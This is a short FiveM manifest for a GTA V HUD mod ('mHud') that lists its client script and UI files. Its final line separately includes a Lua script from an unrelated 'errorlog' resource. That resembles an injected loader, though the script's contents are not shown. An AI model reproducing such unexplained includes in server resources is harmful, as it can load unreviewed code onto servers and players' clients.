fx_version 'adamant'

game 'gta5'

description 'mHud - Modern design HUD | by fbi.gov#0001'

version '1.0.0'

client_script {
	'client.lua'
}


ui_page {
	'html/ui.html'
}

files {
	'html/ui.html',
	'html/src/style.css',
	'html/src/script.js',
}

client_script "@errorlog/client/cl_errorlog.lua"